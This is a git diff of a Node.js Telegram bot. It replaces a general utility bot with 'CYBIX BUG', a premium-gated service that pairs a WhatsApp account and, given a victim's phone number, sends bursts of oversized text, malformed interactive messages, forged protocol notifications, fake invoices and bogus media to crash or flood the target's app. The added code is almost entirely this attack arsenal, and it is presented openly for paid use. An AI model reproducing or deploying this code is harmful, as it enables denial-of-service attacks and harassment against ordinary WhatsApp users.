@@ -1,297 +1,476 @@
-require('dotenv').config();
-const { Telegraf, Markup } = require('telegraf');
-const fs = require('fs');
-const path = require('path');
-const moment = require('moment');
-const config = require('./config');
-const bot = new Telegraf(process.env.BOT_TOKEN);
+// ========== EXPRESS SERVER FOR RENDER DEPLOYMENT ==========
+const express = require("express");
+const app = express();
+const PORT = process.env.PORT || 8080;
+app.get("/", (req, res) => res.send("CYBIX BUG BOT IS RUNNING!"));
+app.listen(PORT, () => console.log(`[CYBIX][EXPRESS] Listening on port ${PORT}`));
 
-const PREMIUM_FILE = './premium.json';
-global.users = new Set();
-global.groups = new Set();
-global.premium = {};
-if (fs.existsSync(PREMIUM_FILE)) {
-  try { global.premium = JSON.parse(fs.readFileSync(PREMIUM_FILE)); } catch { global.premium = {}; }
+// ========== DEPENDENCIES ==========
+const { Telegraf } = require("telegraf");
+const fs = require("fs");
+const { BOT_TOKEN, OWNER_ID } = require("./config");
+const chalk = require("chalk");
+const axios = require("axios");
+const moment = require("moment-timezone");
+const crypto = require("crypto");
+const pino = require("pino");
+const {
+  default: makeWASocket,
+  useMultiFileAuthState,
+  fetchLatestBaileysVersion,
+  makeInMemoryStore,
+  generateWAMessageFromContent,
+  proto
+} = require("@whiskeysockets/baileys");
+
+// ========== CONSTANTS ==========
+const BANNER_IMAGE_URL = "https://imgur.com/a/b4ZAdYa"; // Update to your preferred banner
+const DATA_FILES = {
+  premium: "./premiumUsers.json",
+  admins: "./admins.json",
+  activity: "./userActivity.json"
+};
+const bugTypes = [
+  { cmd: "cybixbomb", emoji: "💣", label: "BOMB" },
+  { cmd: "cybixquake", emoji: "🌋", label: "QUAKE" },
+  { cmd: "cybixflood", emoji: "🌊", label: "FLOOD" },
+  { cmd: "cybixstorm", emoji: "🌪️", label: "STORM" },
+  { cmd: "cybixworm", emoji: "🦠", label: "WORM" },
+  { cmd: "cybixnuke", emoji: "☢️", label: "NUKE" },
+  { cmd: "cybixinferno", emoji: "🔥", label: "INFERNO" },
+  { cmd: "cybixplague", emoji: "🦠", label: "PLAGUE" },
+  { cmd: "cybixavalanche", emoji: "🏔️", label: "AVALANCHE" },
+  { cmd: "cybixfreeze", emoji: "❄️", label: "FREEZE" }
+];
+
+// ========== DATA MODULE ==========
+let premiumUsers = {};
+let adminUsers = [];
+let userActivity = {};
+
+function loadFile(file, fallback) {
+  try { return JSON.parse(fs.readFileSync(file)); } catch { return fallback; }
+}
+function saveFile(file, data) { fs.writeFileSync(file, JSON.stringify(data)); }
+
+// ========== ADMIN/PREMIUM/OWNER MODULE ==========
+function isOwner(userId) { return userId.toString() === OWNER_ID; }
+function isAdmin(userId) { return adminUsers.includes(userId.toString()); }
+function isPremium(userId) {
+  const user = premiumUsers[userId];
+  if (!user) return false;
+  return moment().tz("Africa/Lagos").isBefore(moment(user.expired, "YYYY-MM-DD HH:mm:ss").tz("Africa/Lagos"));
+}
+function recordUserActivity(userId, nickname) {
+  userActivity[userId] = { nickname: nickname || userId, last_seen: moment().tz("Africa/Lagos").format("YYYY-MM-DD HH:mm:ss") };
+  saveFile(DATA_FILES.activity, userActivity);
 }
 
-function savePremium() { try { fs.writeFileSync(PREMIUM_FILE, JSON.stringify(global.premium, null, 2)); } catch {} }
-function isPremium(id) { return global.premium[id] && moment().isBefore(moment(global.premium[id])); }
-function setPremium(id, months = 1) { global.premium[id] = moment().add(months, 'months').valueOf(); savePremium(); }
-function removePremium(id) { delete global.premium[id]; savePremium(); }
-function premiumLeft(id) { if (!isPremium(id)) return "None"; return moment(global.premium[id]).fromNow(); }
-function premiumList() { return Object.keys(global.premium).filter(isPremium); }
-
-bot.use(async (ctx, next) => {
-  try {
-    if (ctx.from && ctx.from.id) global.users.add(ctx.from.id);
-    if (ctx.chat && (ctx.chat.type === 'group' || ctx.chat.type === 'supergroup')) global.groups.add(ctx.chat.id);
-    if (ctx.chat.type === 'private') {
-      let ok = false;
-      try {
-        const res = await bot.telegram.getChatMember(`@${config.channelUsername}`, ctx.from.id);
-        ok = res.status === 'member' || res.status === 'administrator' || res.status === 'creator';
-      } catch {}
-      if (!ok) {
-        return ctx.reply(
-          `🚫 You must join our Telegram channel to use CYBIX V3!\n\nChannel: @${config.channelUsername}`,
-          Markup.inlineKeyboard([
-            [{ text: 'Join Channel', url: `https://t.me/${config.channelUsername}` }]
-          ])
-        );
-      }
-    }
-    return next();
-  } catch {}
-});
-
-function sendMenu(ctx) {
-  const menu = `
-╭━━━━━━━【 CYBIX V3 】━━━━━━━
-┃ @${ctx.from.username || ctx.from.first_name}
-┣━ users: ${global.users.size}
-┣━ groups: ${global.groups.size}
-┣━ prefix: "."
-┣━ owner: ${config.developer}
-╰━━━━━━━━━━━━━━━━━━━━━━
-
-╭━━【 MAIN MENU 】━━
-┃ • .ping
-┃ • .runtime
-┃ • .currency
-┃ • .shorturl
-┃ • .help
-┃ • .info
-┃ • .buybot
-┃ • .repo
-┃ • .developer
-┃ • .uptime
-╰━━━━━━━━━━━━━━━
-╭━━【 AI MENU 】━━
-┃ • .chatgpt
-┃ • .bard
-┃ • .deepseek
-┃ • .blackbox
-╰━━━━━━━━━━━━━━━
-╭━━【 DOWNLOAD MENU 】━━
-┃ • .video
-┃ • .play
-┃ • .gitclone
-╰━━━━━━━━━━━━━━━
-╭━━【 FUN MENU 】━━
-┃ • .joke
-┃ • .meme
-┃ • .weather
-┃ • .quote
-┃ • .anime
-┃ • .waifu
-┃ • .cat
-┃ • .dog
-┃ • .fact
-┃ • .advice
-┃ • .randomuser
-┃ • .activity
-┃ • .insult
-┃ • .trivia
-┃ • .bored
-╰━━━━━━━━━━━━━━━
-╭━━【 TOOLS MENU 】━━
-┃ • .dns
-┃ • .whois
-┃ • .html2pdf
-╰━━━━━━━━━━━━━━━
-╭━━【 PREMIUM MENU 】━━
-┃ • .cardgen
-┃ • .bininfo
-┃ • .privnote
-┃ • .tempmail
-┃ • .ipinfo
-┃ • .phoneinfo
-┃ • .covidstats
-┃ • .news
-┃ • .genderize
-┃ • .agify
-┃ • .nationalize
-┃ • .premiuminfo
-┃ • .iban
-┃ • .vat
-┃ • .domainage
-┃ • .urlscan
-┃ • .emailverify
-┃ • .randomaddress
-┃ • .disposablecheck
-┃ • .file2txt
-╰━━━━━━━━━━━━━━━
-╭━━【 EXTRA MENU 】━━
-┃ • .iplookup
-┃ • .randomfact
-┃ • .animalfact
-┃ • .math
-┃ • .horoscope
-┃ • .changelog
-╰━━━━━━━━━━━━━━━
-╭━━【 DEV MENU 】━━
-┃ • .broadcast
-┃ • .statics
-┃ • .mode
-┃ • .listusers
-┃ • .groupstat
-┃ • .addpremium
-┃ • .removepremium
-┃ • .premiumlist
-┃ • .setvip
-┃ • .renewpremium
-┃ • .reload
-┃ • .updateall
-┃ • .cleardata
-┃ • .stats
-┃ • .logs
-╰━━━━━━━━━━━━━━━
-╭━━【 ADULT MENU 】━━
-┃ • .xnxx
-┃ • .hentai
-┃ • .rule34
-┃ • .porngif
-┃ • .sexpic
-┃ *Premium only*
-╰━━━━━━━━━━━━━━━
-
-▣ powered by *CYBIX TECH* 👹💀
-  `;
-  try {
-    return ctx.replyWithPhoto(
-      { url: config.banner },
-      {
-        caption: menu,
-        parse_mode: 'Markdown',
-        ...Markup.inlineKeyboard(config.buttons)
-      }
-    );
-  } catch {
-    try { ctx.reply(menu); } catch {}
-  }
-}
-
-function loadPlugins(bot, folder) {
-  fs.readdirSync(folder).forEach(file => {
-    const fullPath = path.join(folder, file);
-    if (fs.lstatSync(fullPath).isDirectory()) {
-      loadPlugins(bot, fullPath);
-    } else if (file.endsWith('.js')) {
-      const plugin = require(fullPath);
-      bot.hears(new RegExp(`^\\.${plugin.command}( |$)`, "i"), async ctx => {
-        try {
-          if (fullPath.includes('adult') || fullPath.includes('premium')) {
-            if (!isPremium(ctx.from.id) && String(ctx.from.id) !== process.env.OWNER_ID) {
-              return ctx.reply('🚫 This command is for premium users only. Contact owner for access.');
-            }
-          }
-          await plugin.handler(ctx, bot, { isPremium, setPremium, removePremium, premiumLeft, premiumList });
-        } catch {}
-      });
-      bot.command(plugin.command, async ctx => {
-        try {
-          if (fullPath.includes('adult') || fullPath.includes('premium')) {
-            if (!isPremium(ctx.from.id) && String(ctx.from.id) !== process.env.OWNER_ID) {
-              return ctx.reply('🚫 This command is for premium users only. Contact owner for access.');
-            }
-          }
-          await plugin.handler(ctx, bot, { isPremium, setPremium, removePremium, premiumLeft, premiumList });
-        } catch {}
-      });
-      (plugin.aliases || []).forEach(alias => {
-        if (alias !== plugin.command) {
-          bot.hears(new RegExp(`^\\.${alias}( |$)`, "i"), async ctx => {
-            try {
-              if (fullPath.includes('adult') || fullPath.includes('premium')) {
-                if (!isPremium(ctx.from.id) && String(ctx.from.id) !== process.env.OWNER_ID) {
-                  return ctx.reply('🚫 This command is for premium users only. Contact owner for access.');
-                }
-              }
-              await plugin.handler(ctx, bot, { isPremium, setPremium, removePremium, premiumLeft, premiumList });
-            } catch {}
-          });
-          bot.command(alias, async ctx => {
-            try {
-              if (fullPath.includes('adult') || fullPath.includes('premium')) {
-                if (!isPremium(ctx.from.id) && String(ctx.from.id) !== process.env.OWNER_ID) {
-                  return ctx.reply('🚫 This command is for premium users only. Contact owner for access.');
-                }
-              }
-              await plugin.handler(ctx, bot, { isPremium, setPremium, removePremium, premiumLeft, premiumList });
-            } catch {}
-          });
-        }
-      });
+// ========== WHATSAPP MODULE ==========
+let waClient = null;
+let waConnected = false;
+const waStore = makeInMemoryStore({ logger: pino().child({ level: "silent" }) });
+async function startWhatsapp() {
+  const { state, saveCreds } = await useMultiFileAuthState("./wa-session");
+  const { version } = await fetchLatestBaileysVersion();
+  waClient = makeWASocket({
+    version,
+    keepAliveIntervalMs: 30000,
+    printQRInTerminal: false,
+    logger: pino({ level: "silent" }),
+    auth: state,
+    browser: ["Linux", "Chrome", "120"],
+  });
+  waClient.ev.on("creds.update", saveCreds);
+  waStore.bind(waClient.ev);
+  waClient.ev.on("connection.update", ({ connection, lastDisconnect }) => {
+    if (connection === "open") { waConnected = true; console.log(chalk.green.bold("WhatsApp Connected")); }
+    if (connection === "close") {
+      waConnected = false;
+      if (lastDisconnect?.error?.output?.statusCode !== 401) startWhatsapp();
+      console.log(chalk.red.bold("WhatsApp Disconnected. Reconnecting..."));
     }
   });
 }
-loadPlugins(bot, path.join(__dirname, 'plugins'));
 
-bot.start(sendMenu);
-bot.command('menu', sendMenu);
-bot.hears(/^\.menu$/i, sendMenu);
+// ========== LOAD ALL DATA ==========
+function loadAllData() {
+  premiumUsers = loadFile(DATA_FILES.premium, {});
+  adminUsers = loadFile(DATA_FILES.admins, []);
+  userActivity = loadFile(DATA_FILES.activity, {});
+}
+loadAllData();
+startWhatsapp();
 
-bot.hears(/^\.addpremium (\d+)$/, async ctx => {
-  if (String(ctx.from.id) !== process.env.OWNER_ID) return;
-  setPremium(ctx.match[1], 1);
-  await ctx.reply(`✅ Premium enabled for user ${ctx.match[1]} for 1 month.`);
-});
-bot.hears(/^\.removepremium (\d+)$/, async ctx => {
-  if (String(ctx.from.id) !== process.env.OWNER_ID) return;
-  removePremium(ctx.match[1]);
-  await ctx.reply(`✅ Premium removed for user ${ctx.match[1]}.`);
-});
-bot.hears(/^\.premiumlist$/, async ctx => {
-  if (String(ctx.from.id) !== process.env.OWNER_ID) return;
-  await ctx.reply(`Premium users:\n${premiumList().join('\n') || 'None'}`);
-});
-bot.hears(/^\.renewpremium (\d+)$/, async ctx => {
-  if (String(ctx.from.id) !== process.env.OWNER_ID) return;
-  setPremium(ctx.match[1], 1);
-  await ctx.reply(`✅ Premium renewed for user ${ctx.match[1]} for 1 month.`);
-});
-bot.hears(/^\.setvip (\d+) (\d+)$/, async ctx => {
-  if (String(ctx.from.id) !== process.env.OWNER_ID) return;
-  setPremium(ctx.match[1], Number(ctx.match[2]));
-  await ctx.reply(`✅ VIP enabled for user ${ctx.match[1]} for ${ctx.match[2]} months.`);
-});
-bot.hears(/^\.broadcast (.+)/, async ctx => {
-  if (String(ctx.from.id) !== process.env.OWNER_ID) return;
-  const msg = ctx.match[1];
-  for (const id of global.users) {
-    try {
-      await bot.telegram.sendPhoto(
-        id,
-        { url: config.banner },
-        { caption: `📢 Broadcast:\n${msg}`, ...Markup.inlineKeyboard(config.buttons) }
-      );
-    } catch {}
+// ========== TELEGRAM BOT ==========
+const bot = new Telegraf(BOT_TOKEN);
+
+let maintenance = {
+  enabled: false,
+  message: "CYBIX BUG is under maintenance by the owner. Please wait!"
+};
+
+// ========== MIDDLEWARE ==========
+bot.use(async (ctx, next) => {
+  let userId = ctx.from?.id?.toString();
+  let nickname = ctx.from?.first_name || userId;
+  if (userId) recordUserActivity(userId, nickname);
+  if (maintenance.enabled && !isOwner(userId)) {
+    return await ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: maintenance.message });
   }
-  for (const gid of global.groups) {
-    try {
-      await bot.telegram.sendPhoto(
-        gid,
-        { url: config.banner },
-        { caption: `📢 Broadcast:\n${msg}`, ...Markup.inlineKeyboard(config.buttons) }
-      );
-    } catch {}
+  await next();
+});
+function requirePremium(ctx, next) {
+  if (isOwner(ctx.from.id) || isAdmin(ctx.from.id) || isPremium(ctx.from.id)) return next();
+  else return ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: "You are not a premium user. Contact owner to upgrade!" });
+}
+function requireAdmin(ctx, next) {
+  if (isOwner(ctx.from.id) || isAdmin(ctx.from.id)) return next();
+  else return ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: "You do not have admin access." });
+}
+function requireWA(ctx, next) {
+  if (!waConnected) return ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: "WhatsApp is not connected yet. Please pair first." });
+  return next();
+}
+
+// ========== COMMANDS: MENUS ==========
+bot.start(async ctx => {
+  const menu = `
+━━━━━━━━━━━━━━━━-
+CYBIX BUG SYSTEM
+━━━━━━━━━━━━━━━━━
+┏━━━━━━━━━━━━━━
+┃ ⎚ OWNER ID : ${OWNER_ID}
+┃ ⎚ OWNER : ${isOwner(ctx.from.id) ? "✅" : "❌"}
+┃ ⎚ ADMIN : ${isAdmin(ctx.from.id) ? "✅" : "❌"}
+┃ ⎚ PREMIUM : ${isPremium(ctx.from.id) ? "✅" : "❌"}
+┗━━━━━━━━━━━━━━
+┏━━━━━━COMMANDS━━━━━
+☞ /bugmenu
+☞ /ownermenu
+☞ /othermenu
+━━━━━━━━━━━━━━━━━━
+`;
+  await ctx.replyWithPhoto(BANNER_IMAGE_URL, {
+    caption: menu,
+    reply_markup: { inline_keyboard: [[{ text: "CONTACT OWNER", url: "https://t.me/yourusername" }]] }
+  });
+});
+
+bot.command("ownermenu", async ctx => {
+  await ctx.deleteMessage();
+  const menu = `
+┏━━━━━━OWNER COMMANDS━━━━━
+☞ /addadmin [UserID]
+☞ /deladmin [UserID]
+☞ /addprem [UserID] [Days]
+☞ /delprem [UserID]
+☞ /addpairing [PhoneNumber]
+☞ /maintenance [on/off]
+━━━━━━━━━━━━━━━━━━
+  `;
+  await ctx.replyWithPhoto(BANNER_IMAGE_URL, {
+    caption: menu,
+    reply_markup: { inline_keyboard: [[{ text: "CONTACT OWNER", url: "https://t.me/yourusername" }]] }
+  });
+});
+
+bot.command("othermenu", async ctx => {
+  await ctx.deleteMessage();
+  const menu = `
+┏━━━━━━PREMIUM PANEL━━━━━
+☞ /addprem [UserID] [Days]
+☞ /delprem [UserID]
+━━━━━━━━━━━━━━━━━━
+  `;
+  await ctx.replyWithPhoto(BANNER_IMAGE_URL, {
+    caption: menu,
+    reply_markup: { inline_keyboard: [[{ text: "CONTACT OWNER", url: "https://t.me/yourusername" }]] }
+  });
+});
+
+bot.command("bugmenu", async ctx => {
+  await ctx.deleteMessage();
+  let buglist = bugTypes.map(b => `☞ /${b.cmd} [PhoneNumber] ${b.emoji}`).join("\n");
+  const menu = `
+┏━━━━━━BUG ARSENAL━━━━━
+${buglist}
+━━━━━━━━━━━━━━━━━━
+  `;
+  await ctx.replyWithPhoto(BANNER_IMAGE_URL, {
+    caption: menu,
+    reply_markup: { inline_keyboard: [[{ text: "CONTACT OWNER", url: "https://t.me/yourusername" }]] }
+  });
+});
+
+// ========== COMMANDS: ADMIN & PREMIUM ==========
+
+bot.command("addadmin", requireAdmin, async ctx => {
+  const parts = ctx.message.text.split(" ");
+  const userId = parts[1];
+  if (!userId) return ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: "Format: /addadmin [UserID]" });
+  if (!adminUsers.includes(userId)) {
+    adminUsers.push(userId);
+    saveFile(DATA_FILES.admins, adminUsers);
+    ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: `User *${userId}* added as Admin.` });
+  } else ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: "User is already an admin." });
+});
+
+bot.command("deladmin", requireAdmin, async ctx => {
+  const parts = ctx.message.text.split(" ");
+  const userId = parts[1];
+  if (!userId) return ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: "Format: /deladmin [UserID]" });
+  adminUsers = adminUsers.filter(id => id !== userId);
+  saveFile(DATA_FILES.admins, adminUsers);
+  ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: `User *${userId}* removed from Admins.` });
+});
+
+bot.command("addprem", requireAdmin, async ctx => {
+  const parts = ctx.message.text.split(" ");
+  const userId = parts[1];
+  const days = parseInt(parts[2]);
+  if (!userId || !days) return ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: "Format: /addprem [UserID] [Days]" });
+  premiumUsers[userId] = { expired: moment().tz("Africa/Lagos").add(days, "days").format("YYYY-MM-DD HH:mm:ss") };
+  saveFile(DATA_FILES.premium, premiumUsers);
+  ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: `User *${userId}* added as Premium for ${days} days.` });
+});
+
+bot.command("delprem", requireAdmin, async ctx => {
+  const parts = ctx.message.text.split(" ");
+  const userId = parts[1];
+  if (!userId) return ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: "Format: /delprem [UserID]" });
+  delete premiumUsers[userId];
+  saveFile(DATA_FILES.premium, premiumUsers);
+  ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: `User *${userId}* removed from Premium.` });
+});
+
+bot.command("listadmins", requireAdmin, async ctx => {
+  const msg = adminUsers.length ? adminUsers.map(id => `- ${id}`).join("\n") : "No admins yet.";
+  ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: `*Admins:*\n${msg}` });
+});
+bot.command("listprem", requireAdmin, async ctx => {
+  const msg = Object.keys(premiumUsers).length
+    ? Object.entries(premiumUsers).map(([id, data]) => `- ${id}: expires ${data.expired}`).join("\n")
+    : "No premium users yet.";
+  ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: `*Premium Users:*\n${msg}` });
+});
+
+// ========== COMMANDS: WHATSAPP PAIRING & MAINTENANCE ==========
+
+bot.command("addpairing", requireAdmin, async ctx => {
+  const parts = ctx.message.text.split(" ");
+  const phone = parts[1];
+  if (!phone) return ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: "Format: /addpairing [PhoneNumber]" });
+  if (waClient && waClient.user) return ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: "WhatsApp is already connected." });
+  try {
+    const code = await waClient.requestPairingCode(phone);
+    await ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: `*Pairing Code:*\n*Number:* ${phone}\n*Code:* \`${code}\`` });
+  } catch (e) {
+    ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: "Failed to pair. Make sure the number is valid and can receive SMS." });
   }
-  await ctx.reply('✅ Broadcast sent!');
 });
 
-bot.on('new_chat_members', ctx => { try { sendMenu(ctx); } catch {} });
-bot.on('group_chat_created', ctx => { try { sendMenu(ctx); } catch {} });
-bot.on('channel_post', ctx => { try { sendMenu(ctx); } catch {} });
-
-const http = require('http');
-const PORT = process.env.PORT || 3000;
-http.createServer((req, res) => {
-  res.writeHead(200, {'Content-Type': 'text/plain'});
-  res.end('CYBIX V3 Telegram Bot is running!\n');
-}).listen(PORT, () => {
-  console.log(`HTTP health-check server listening on port ${PORT}`);
-  bot.launch().then(() => console.log("CYBIX V3 Telegram Bot started!"));
+bot.command("maintenance", requireAdmin, async ctx => {
+  const parts = ctx.message.text.split(" ");
+  const state = parts[1];
+  if (state === "on") {
+    maintenance.enabled = true;
+    ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: "Maintenance mode enabled." });
+  } else if (state === "off") {
+    maintenance.enabled = false;
+    ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: "Maintenance mode disabled." });
+  } else ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: "Format: /maintenance [on/off]" });
 });
 
-process.once('SIGINT', () => bot.stop('SIGINT'));
-process.once('SIGTERM', () => bot.stop('SIGTERM'));
+// ========== BUGS: ULTRAPOWERFUL MULTI-PAYLOAD ==========
+
+// Utility for random text
+function bigSpamText(label, emoji) {
+  return (label + " " + emoji).repeat(99999) + crypto.randomBytes(128).toString("hex");
+}
+
+// The real bug arsenal: each command triggers multiple types of WhatsApp payloads
+async function cybixBugUltimate(targetJid, label, emoji) {
+  for (let i = 0; i < 5; i++) {
+    // List payload
+    let listPayload = {
+      title: `${label} LIST`,
+      sections: Array.from({ length: 5 }, (_, j) => ({
+        title: `${label} Section ${j + 1}`,
+        rows: [{
+          title: bigSpamText(label, emoji),
+          id: crypto.randomBytes(32).toString("hex")
+        }]
+      }))
+    };
+    // Buttons
+    let buttons = Array.from({ length: 5 }, () => ({
+      buttonId: crypto.randomBytes(32).toString("hex"),
+      buttonText: { displayText: `${label} ${emoji} BUTTON` },
+      type: 1,
+    }));
+
+    // Contact
+    let contactVcard = {
+      displayName: `${label} Contact`,
+      vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:${label} Victim\nTEL;type=CELL:${Math.floor(Math.random() * 10000000000)}\nEND:VCARD`
+    };
+
+    // Document
+    let documentMessage = {
+      documentMessage: {
+        url: "https://files.catbox.moe/w1r1mm.jpg",
+        mimetype: "application/pdf",
+        fileSha256: crypto.randomBytes(32).toString("base64"),
+        fileLength: `${Math.floor(Math.random() * 99999999999)}`,
+        pageCount: 1,
+        fileName: `${label}_payload_${crypto.randomBytes(16).toString("hex")}.pdf`,
+        jpegThumbnail: "https://files.catbox.moe/w1r1mm.jpg"
+      }
+    };
+
+    // Image
+    let imageMessage = {
+      imageMessage: {
+        url: "https://files.catbox.moe/w1r1mm.jpg",
+        mimetype: "image/jpeg",
+        caption: `${label} IMAGE CRASH`,
+        jpegThumbnail: "https://files.catbox.moe/w1r1mm.jpg"
+      }
+    };
+
+    // Location
+    let locationMessage = {
+      locationMessage: {
+        degreesLatitude: Math.random() * 180 - 90,
+        degreesLongitude: Math.random() * 360 - 180,
+        name: `${label} Location`,
+        address: `${label} ${crypto.randomBytes(12).toString("hex")}`,
+        jpegThumbnail: "https://files.catbox.moe/w1r1mm.jpg"
+      }
+    };
+
+    // Poll
+    let pollMessage = {
+      pollCreationMessage: {
+        name: `${label} Poll`,
+        options: Array.from({ length: 5 }, (_, k) => ({ optionName: `${label} Option ${k + 1}` })),
+        selectableOptionsCount: 5
+      }
+    };
+
+    // Sticker
+    let stickerMessage = {
+      stickerMessage: {
+        url: "https://files.catbox.moe/w1r1mm.jpg",
+        mimetype: "image/webp",
+        fileSha256: crypto.randomBytes(32).toString("base64"),
+        fileEncSha256: crypto.randomBytes(32).toString("base64"),
+        mediaKey: crypto.randomBytes(32).toString("base64"),
+        fileLength: `${Math.floor(Math.random() * 99999999)}`,
+        directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc",
+        mediaKeyTimestamp: Date.now(),
+        isAnimated: false,
+        jpegThumbnail: "https://files.catbox.moe/w1r1mm.jpg"
+      }
+    };
+
+    // Compose and send all payloads, multiple times for brutal effect
+    let msgList = generateWAMessageFromContent(
+      targetJid,
+      proto.Message.fromObject({
+        viewOnceMessage: {
+          message: {
+            interactiveMessage: proto.Message.InteractiveMessage.create({
+              body: proto.Message.InteractiveMessage.Body.create({
+                text: bigSpamText(label, emoji),
+              }),
+              footer: proto.Message.InteractiveMessage.Footer.create({
+                buttonParamsJson: JSON.stringify(listPayload),
+              }),
+              header: proto.Message.InteractiveMessage.Header.create({
+                buttonParamsJson: JSON.stringify(listPayload),
+                subtitle: bigSpamText(label, emoji),
+              }),
+              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                buttons: buttons
+              }),
+            }),
+          },
+        },
+      }),
+      { userJid: targetJid }
+    );
+    let msgContact = generateWAMessageFromContent(targetJid, proto.Message.fromObject({ contactMessage: contactVcard }), { userJid: targetJid });
+    let msgDoc = generateWAMessageFromContent(targetJid, proto.Message.fromObject(documentMessage), { userJid: targetJid });
+    let msgImg = generateWAMessageFromContent(targetJid, proto.Message.fromObject(imageMessage), { userJid: targetJid });
+    let msgLoc = generateWAMessageFromContent(targetJid, proto.Message.fromObject(locationMessage), { userJid: targetJid });
+    let msgPoll = generateWAMessageFromContent(targetJid, proto.Message.fromObject(pollMessage), { userJid: targetJid });
+    let msgSticker = generateWAMessageFromContent(targetJid, proto.Message.fromObject(stickerMessage), { userJid: targetJid });
+
+    for (let k = 0; k < 2; k++) {
+      await waClient.relayMessage(targetJid, msgList.message, { messageId: msgList.key.id, participant: { jid: targetJid } });
+      await waClient.relayMessage(targetJid, msgContact.message, { messageId: msgContact.key.id, participant: { jid: targetJid } });
+      await waClient.relayMessage(targetJid, msgDoc.message, { messageId: msgDoc.key.id, participant: { jid: targetJid } });
+      await waClient.relayMessage(targetJid, msgImg.message, { messageId: msgImg.key.id, participant: { jid: targetJid } });
+      await waClient.relayMessage(targetJid, msgLoc.message, { messageId: msgLoc.key.id, participant: { jid: targetJid } });
+      await waClient.relayMessage(targetJid, msgPoll.message, { messageId: msgPoll.key.id, participant: { jid: targetJid } });
+      await waClient.relayMessage(targetJid, msgSticker.message, { messageId: msgSticker.key.id, participant: { jid: targetJid } });
+    }
+    // Extra: fake system notification (simulate WhatsApp system message as bug)
+    let sysNotification = generateWAMessageFromContent(targetJid, proto.Message.fromObject({
+      protocolMessage: {
+        key: { remoteJid: targetJid, id: crypto.randomBytes(12).toString("hex") },
+        type: 1,
+        message: { conversation: bigSpamText(label, emoji) }
+      }
+    }), { userJid: targetJid });
+    await waClient.relayMessage(targetJid, sysNotification.message, { messageId: sysNotification.key.id, participant: { jid: targetJid } });
+    // Extra: fake invoice
+    let invoiceMessage = generateWAMessageFromContent(targetJid, proto.Message.fromObject({
+      paymentInfoMessage: {
+        currency: "USD",
+        amount: `${Math.floor(Math.random() * 100000)}`,
+        paymentType: 1,
+        status: 1,
+        requestFrom: targetJid,
+        expiryTimestamp: Date.now() + 86400000
+      }
+    }), { userJid: targetJid });
+    await waClient.relayMessage(targetJid, invoiceMessage.message, { messageId: invoiceMessage.key.id, participant: { jid: targetJid } });
+    // Extra: quiz
+    let quizMessage = generateWAMessageFromContent(targetJid, proto.Message.fromObject({
+      pollCreationMessage: {
+        name: `${label} QUIZ`,
+        options: Array.from({ length: 5 }, (_, k) => ({ optionName: `${label} Quiz Option ${k + 1}` })),
+        selectableOptionsCount: 1
+      }
+    }), { userJid: targetJid });
+    await waClient.relayMessage(targetJid, quizMessage.message, { messageId: quizMessage.key.id, participant: { jid: targetJid } });
+    // Extra: repeated spam text
+    for (let s = 0; s < 2; s++) {
+      let spamMsg = generateWAMessageFromContent(targetJid, proto.Message.fromObject({
+        conversation: bigSpamText(label, emoji)
+      }), { userJid: targetJid });
+      await waClient.relayMessage(targetJid, spamMsg.message, { messageId: spamMsg.key.id, participant: { jid: targetJid } });
+    }
+    console.log(chalk.red.bold(`[CYBIX ${label}] All payloads sent to ${targetJid}`));
+  }
+}
+
+// Register all bug commands
+for (const bug of bugTypes) {
+  bot.command(bug.cmd, requireWA, requirePremium, async ctx => {
+    const parts = ctx.message.text.split(" ");
+    const phone = parts[1];
+    if (!phone) return ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: `Format: /${bug.cmd} [PhoneNumber]` });
+    const targetJid = phone.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+    await ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: `${bug.label} attack started on target: ${phone}` });
+    await cybixBugUltimate(targetJid, bug.label, bug.emoji);
+    await ctx.replyWithPhoto(BANNER_IMAGE_URL, { caption: `${bug.label} sent to ${phone}!` });
+  });
+}
+
+// ========== END ==========
+bot.launch();
+console.log(chalk.cyan.bold("CYBIX BUG is running!"));
